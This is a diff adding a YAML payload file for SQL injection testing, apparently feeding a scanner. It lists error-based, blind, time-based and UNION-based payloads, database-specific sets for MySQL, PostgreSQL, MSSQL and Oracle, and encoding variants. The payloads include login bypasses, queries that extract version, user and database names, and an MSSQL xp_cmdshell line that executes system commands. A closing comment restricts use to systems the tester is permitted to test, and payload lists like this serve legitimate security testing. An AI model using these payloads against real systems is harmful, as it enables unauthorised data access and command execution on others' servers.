@@ -1,0 +1,115 @@
+# SQL Injection Payloads
+# These payloads are used to test for SQL injection vulnerabilities
+
+payloads:
+  # Error-based SQL injection
+  error_based:
+    - "'"
+    - "\""
+    - "' OR '1'='1"
+    - "\" OR \"1\"=\"1"
+    - "' OR '1'='1' -- "
+    - "' OR '1'='1' #"
+    - "' OR '1'='1' /*"
+    - "1' OR '1'='1"
+    - "1' OR '1'='1' -- "
+    - "admin' --"
+    - "admin' #"
+    - "admin'/*"
+    - "' UNION SELECT NULL--"
+    - "' UNION SELECT NULL,NULL--"
+    - "' UNION SELECT NULL,NULL,NULL--"
+
+  # Boolean-based blind SQL injection
+  boolean_based:
+    - "' AND '1'='1"
+    - "' AND '1'='2"
+    - "' OR '1'='1' AND '1'='1"
+    - "' OR '1'='1' AND '1'='2"
+    - "1' AND SLEEP(5)--"
+    - "1' AND SLEEP(5) AND '1'='1"
+    - "1' AND SLEEP(5) AND '1'='2"
+
+  # Time-based blind SQL injection
+  time_based:
+    - "' AND SLEEP(5)--"
+    - "' AND SLEEP(5) AND '1'='1"
+    - "' AND SLEEP(5) AND '1'='2"
+    - "'; WAITFOR DELAY '00:00:05'--"
+    - "'; SELECT pg_sleep(5)--"
+    - "'; SELECT SLEEP(5)--"
+
+  # UNION-based SQL injection
+  union_based:
+    - "' UNION SELECT NULL--"
+    - "' UNION SELECT NULL,NULL--"
+    - "' UNION SELECT NULL,NULL,NULL--"
+    - "' UNION SELECT 1--"
+    - "' UNION SELECT 1,2--"
+    - "' UNION SELECT 1,2,3--"
+    - "' UNION SELECT @@version--"
+    - "' UNION SELECT user()--"
+    - "' UNION SELECT database()--"
+
+  # Database-specific payloads
+  mysql:
+    - "' OR 1=1--"
+    - "' OR 1=1#"
+    - "' OR 1=1/*"
+    - "' UNION SELECT 1,2,3--"
+    - "' UNION SELECT @@version,user(),database()--"
+
+  postgresql:
+    - "' OR 1=1--"
+    - "' OR 1=1/*"
+    - "' UNION SELECT NULL--"
+    - "' UNION SELECT version(),current_user,current_database()--"
+
+  mssql:
+    - "' OR 1=1--"
+    - "'; EXEC xp_cmdshell('dir')--"
+    - "' UNION SELECT NULL--"
+    - "' UNION SELECT @@version,user_name(),db_name()--"
+
+  oracle:
+    - "' OR 1=1--"
+    - "' OR '1'='1"
+    - "' UNION SELECT NULL FROM DUAL--"
+    - "' UNION SELECT banner FROM v$version--"
+
+# Encoding variations
+encodings:
+  - url
+  - html
+  - unicode
+  - double_url
+  - base64
+
+# Context-specific payloads
+contexts:
+  numeric:
+    - "1 OR 1=1"
+    - "1 OR 1=2"
+    - "1 AND 1=1"
+    - "1 AND 1=2"
+    - "1' OR '1'='1"
+    - "1' OR '1'='2"
+
+  string:
+    - "' OR '1'='1"
+    - "' OR '1'='2"
+    - "' AND '1'='1"
+    - "' AND '1'='2"
+    - "\" OR \"1\"=\"1"
+    - "\" OR \"1\"=\"2"
+
+  like:
+    - "%' OR '1'='1"
+    - "%' OR '1'='2"
+    - "_' OR '1'='1"
+    - "_' OR '1'='2"
+
+# Notes:
+# - These payloads should only be used on systems you have permission to test
+# - Always use with caution and respect rate limits
+# - Monitor target system response and adjust payloads accordingly
